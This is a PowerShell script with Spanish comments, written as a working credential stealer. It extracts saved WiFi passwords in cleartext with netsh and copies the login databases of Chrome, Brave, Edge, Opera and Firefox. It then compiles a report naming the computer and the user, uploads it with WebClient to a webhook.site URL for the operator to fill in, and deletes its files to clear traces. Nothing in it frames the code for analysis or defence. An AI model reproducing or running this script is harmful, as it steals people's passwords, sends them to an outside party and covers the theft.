# ---------- CONFIGURACIÓN ----------
$webhook = "https://webhook.site/TU_URL_DEL_WEBHOOK"   # <-- CAMBIA ESTO
# ------------------------------------

Write-Host "[*] Iniciando recolección de datos..." -ForegroundColor Cyan

# Ir al directorio temporal
cd $env:temp

# ========== EXTRACCIÓN DE CONTRASEÑAS WIFI ==========
Write-Host "[*] Extrayendo perfiles WiFi..." -ForegroundColor Yellow
$wifiFile = "wifi.txt"

# Obtener lista de perfiles
$perfiles = netsh wlan show profiles | Select-String ':' | ForEach-Object { ($_ -split ':')[1].Trim() }

if ($perfiles.Count -gt 0) {
    "--- WIFI PASSWORDS ---" | Out-File $wifiFile
    foreach ($nombre in $perfiles) {
        Write-Host "    Procesando: $nombre" -ForegroundColor Gray
        $info = netsh wlan show profile name="$nombre" key=clear | Select-String 'Contenido de la clave'
        if ($info) {
            $pass = ($info -split ':')[1].Trim()
        } else {
            $pass = "No disponible"
        }
        "$nombre : $pass" | Out-File $wifiFile -Append
    }
} else {
    "--- WIFI PASSWORDS ---" | Out-File $wifiFile
    "No se encontraron redes WiFi guardadas." | Out-File $wifiFile -Append
}
Write-Host "[OK] WiFi procesado." -ForegroundColor Green

# ========== EXTRACCIÓN DE NAVEGADORES ==========
Write-Host "[*] Extrayendo datos de navegadores..." -ForegroundColor Yellow

# Función para copiar archivos de forma segura
function Copy-Safe {
    param($source, $dest)
    if (Test-Path $source) {
        Copy-Item $source $dest -ErrorAction SilentlyContinue
        Write-Host "    Copiado: $dest" -ForegroundColor Gray
    }
}

# Chrome, Brave, Edge (Chromium)
$browsers = @(
    @{Path="Google\Chrome"; Name="Chrome"},
    @{Path="BraveSoftware\Brave-Browser"; Name="Brave"},
    @{Path="Microsoft\Edge"; Name="Edge"}
)
foreach ($b in $browsers) {
    $source = "$env:LOCALAPPDATA\$($b.Path)\User Data\Default\Login Data"
    $dest = "$($b.Name).db"
    Copy-Safe $source $dest
}

# Opera
$operaSource = "$env:APPDATA\Opera Software\Opera Stable\Login Data"
Copy-Safe $operaSource "Opera.db"

# Firefox
$ffProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffProfiles) {
    $profile = Get-ChildItem $ffProfiles -Directory -ErrorAction SilentlyContinue | 
               Where-Object Name -like '*.default*' | Select-Object -First 1
    if ($profile) {
        $ffSource = "$ffProfiles\$profile\logins.json"
        Copy-Safe $ffSource "Firefox.json"
    }
}
Write-Host "[OK] Navegadores procesados." -ForegroundColor Green

# ========== GENERAR REPORTE ==========
Write-Host "[*] Generando reporte..." -ForegroundColor Yellow
$reportFile = "report.txt"

# Encabezado
@(
    "========================================"
    "       REPORTE DE CREDENCIALES"
    "========================================"
    "PC: $env:COMPUTERNAME"
    "Usuario: $env:USERNAME"
    "Fecha: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    ""
) | Out-File $reportFile

# Sección WiFi
if (Test-Path $wifiFile) {
    Get-Content $wifiFile | Out-File $reportFile -Append
} else {
    "--- WIFI PASSWORDS ---" | Out-File $reportFile -Append
    "No se pudo obtener información WiFi." | Out-File $reportFile -Append
}
"" | Out-File $reportFile -Append

# Sección Navegadores
"--- BROWSERS ---" | Out-File $reportFile -Append
$archivos = Get-ChildItem *.db,*.json -ErrorAction SilentlyContinue
if ($archivos) {
    $archivos | ForEach-Object { $_.Name } | Out-File $reportFile -Append
} else {
    "No se encontraron archivos de navegadores." | Out-File $reportFile -Append
}
"" | Out-File $reportFile -Append
"========================================" | Out-File $reportFile -Append

Write-Host "[OK] Reporte generado." -ForegroundColor Green

# ========== ENVÍO AL WEBHOOK ==========
Write-Host "[*] Enviando datos a webhook..." -ForegroundColor Yellow
try {
    $wc = New-Object System.Net.WebClient
    $data = Get-Content $reportFile -Raw
    $wc.UploadString($webhook, $data)
    Write-Host "[OK] Envío exitoso." -ForegroundColor Green
} catch {
    Write-Host "[ERROR] Fallo el envío: $_" -ForegroundColor Red
}

# ========== LIMPIEZA ==========
Write-Host "[*] Limpiando rastros..." -ForegroundColor Yellow
Remove-Item *.xml,*.txt,*.db,*.json -Force -ErrorAction SilentlyContinue
Write-Host "[OK] Limpieza completada." -ForegroundColor Green

Write-Host "[*] Proceso finalizado." -ForegroundColor Cyan